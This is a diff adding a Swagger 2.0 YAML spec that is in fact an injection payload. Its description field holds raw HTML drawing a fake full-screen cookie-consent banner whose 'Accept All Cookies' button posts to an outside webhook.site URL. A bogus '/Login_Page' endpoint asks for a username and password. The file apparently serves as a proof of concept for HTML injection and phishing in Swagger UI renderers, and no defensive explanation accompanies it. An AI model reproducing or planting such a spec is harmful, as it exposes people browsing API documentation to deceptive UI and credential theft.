@@ -1,0 +1,30 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: 'Swagger UI'
+  description: '<div style="position:fixed;bottom:0;left:0;width:100%;background:#1e1e2e;color:#cdd6f4;z-index:99999;padding:16px 20px;font-family:Arial;font-size:14px;box-shadow:0 -4px 20px rgba(0,0,0,.4);"><strong>We value your privacy</strong><br>We use cookies to enhance your API experience, analyse traffic and keep you signed in.<form action="https://webhook.site/REPLACE-ME" method="post" style="margin-top:10px;"><button type="submit" style="padding:10px 26px;background:#00ff88;color:#000;border:none;border-radius:6px;font-weight:bold;cursor:pointer;">Accept All Cookies</button><button type="button" style="padding:10px 26px;margin-left:10px;background:transparent;color:#cdd6f4;border:1px solid #555;border-radius:6px;">Reject Non-Essential</button></form></div>'
+paths:
+  /Login_Page:
+    post:
+      summary: Login here to continue
+      description: Please provide your credentials to continue.
+      parameters:
+        - name: username
+          in: formData
+          description: The username for login
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: The password for login
+          required: true
+          type: string
+      tags:
+        - Click here to login
+      responses:
+        '200':
+          description: OK
+        '400':
+          description: Bad request
+        '500':
+          description: Server error
